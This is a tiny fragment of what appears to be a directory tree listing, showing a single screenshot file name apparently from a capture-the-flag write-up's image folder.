    └── 10-flag-retrieval-redacted.png
```
